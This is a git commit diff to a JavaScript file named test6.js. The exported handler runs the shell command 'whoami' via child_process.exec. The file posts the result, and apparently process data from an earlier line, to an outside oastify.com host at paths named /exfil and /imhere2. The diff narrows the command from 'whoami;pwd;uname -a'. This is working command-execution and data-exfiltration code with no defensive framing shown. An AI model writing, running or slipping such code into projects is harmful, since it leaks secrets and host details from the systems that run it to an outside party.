22704379f1f2fe2ef3560069621d25b2fe0b4374
Martin <martinbydefault@gmail.com>
2024-05-21 09:13:58 -0300

    Update test6.js

--- test6.js
+++ test6.js
@@ -4,8 +4,8 @@ axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.
 
 module.exports = (context, req, res) => {
   var exec = require('child_process').exec;
-  var cmd = 'whoami;pwd;uname -a';
-  var result = exec(cmd, function(error, stdout, stderr) { return stdout; });
+  var cmd = 'whoami';
+  var result = exec(cmd, function(error, stdout, stderr) {  });
   axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2', result)
   return true;
 };
